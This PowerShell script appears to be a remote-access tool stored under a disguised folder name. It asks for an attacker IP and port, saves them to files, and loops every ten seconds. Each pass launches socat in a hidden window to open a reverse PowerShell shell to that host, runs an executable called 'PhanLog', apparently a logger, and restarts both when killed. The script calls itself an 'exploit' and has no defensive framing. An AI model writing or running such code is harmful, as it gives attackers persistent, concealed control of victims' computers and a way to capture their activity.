if (Test-Path -Path 'C:\Program Files\ZOLOFT\ZOLOFT\socat-windows-master\ipaddress' -PathType Leaf ){
	Write-Host "Parameters Already Set"
	
}else{

$Ip = Read-Host "Enter IP address (0.0.0.0)"
Write-Host "IP set to $Ip"
New-Item -Path ./ -Name "ipaddress" -ItemType "file" 
echo $Ip > ipaddress
Write-Host "Created IP Persistance"
$Port = Read-Host "Enter Port (4 digits)"
Write-Host "Port Number set to $Port" 
New-Item -Path ./ -Name "portnumber" -ItemType "file" 
echo $Port > portnumber
Write-Host "Created Port Persistance"
}

$scriptBlock = [Scriptblock]::Create(@'
if(Get-Process -Name socat){
	Write-Host "socat running..."
	$Restart = Read-Host "Restart? y/n"
	if($Restart = "y"){
		
		Write-Host "Restartin' exploit"	
		taskkill /IM powershell.exe /F
	 	taskkill /IM socat.exe /F
	 	taskkill /IM PhanLog.exe /F
	
		powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
		powershell.exe -windowstyle hidden .\PhanLog\PhanLog.exe

	}
	
	
}else{
	Write-Host "runnin' exploit"	
	
	powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
	powershell.exe -windowstyle hidden .\PhanLog\PhanLog.exe

}
'@)

while($true){
$Ip = Get-Content ipaddress
$Port = Get-Content portnumber
Invoke-Command -ScriptBlock $scriptBlock
Start-Sleep -Seconds 10



}


